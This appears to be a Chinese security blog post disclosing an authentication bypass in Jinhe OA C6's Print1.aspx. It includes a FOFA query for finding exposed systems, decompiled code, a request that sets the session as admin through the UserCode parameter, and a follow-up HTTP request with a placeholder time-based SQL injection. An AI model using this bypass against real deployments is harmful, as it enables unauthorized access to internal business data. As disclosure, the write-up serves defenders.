---
title: "金和OA Print1.aspx 权限绕过漏洞"
source: https://mrxn.net/jswz/jhsoft-Print1-authbypass.html
asset_dir: assets/金和oa-print1.aspx-权限绕过漏洞
---

# 金和OA Print1.aspx 权限绕过漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/10 13:31
- 431浏览
- [0评论](#comment)
- 11分钟阅读

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。该系统的 Print1.aspx 文件处理模块存在权限校验逻辑漏洞，攻击者可通过构造特定请求参数（如用户身份标识或路径参数）[绕过正常权限控](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)制机制，直接访问未授权的敏感接口或资源。该漏洞可能导致内部文件泄露、未授权操作执行等风险，攻击者可借此获取员工通讯录、审批流程记录等核心业务数据，甚至通过横向渗透进一步威胁企业内网安全。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

根据 `Print1.aspx` 的源码，在 `bin` 目录下查找 `JHBase.Web.Calendar.dll` 将其进行反编译后找到 **Print1** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.Request.QueryString["UserCode"] != null)
    this.strUserCode = this.Request.QueryString["UserCode"].ToString();
  if (this.Session["UserCode"] == null)
    this.Session["UserCode"] = (object) this.strUserCode;
  this.InitText();
}
```

参数**UserCode**的值被直接赋值到**session**里了，就[绕过了系统的权限校验](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)。

# 漏洞复现

本来在不使用xxx.aspx/ 这绕过权限姿势时，是会重定向到登录页面，甚至代码逻辑中带有session校验的即使使用 xxx.aspx/ 这种姿势也不行时，还是会被重定向到登录页或者因为session校验不通过报错而不能继续执行代码的

网络安全

[![金和OA Print1.aspx 权限绕过漏洞](images/img-001-97b32c285a6d.webp)](https://image.mrxn.net/9ddd905a9a4b450ea0387b9c21dac3f5.webp)

> 还是有限制，需要绕过系统对aspx的拦截

通过先访问 `/c6/Jhsoft.Web.calendar/public/Print1.aspx/?UserCode=admin` 来获取session

[![金和OA Print1.aspx 权限绕过漏洞](images/img-002-8e391eaa8fee.webp)](https://image.mrxn.net/025c0f74ddc94493a5c0ff6baea88de1.webp)

再携带session的cookie进行利用即可成功利用

安全运维咨询

```
GET /c6/Jhsoft.Web.Calendar/CalendarView.aspx?CalendarId=SQLI_POC HTTP/1.1
Host: jhsoft.mrxn.net
Cookie: ASP.NET_SessionId=xxxxxx
```

[![金和OA Print1.aspx 权限绕过漏洞](images/img-003-710209a0ee80.webp)](https://image.mrxn.net/eca0a3d2fa9744e09f767cb9637e4576.webp)

成功延时 4 秒

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#权限绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
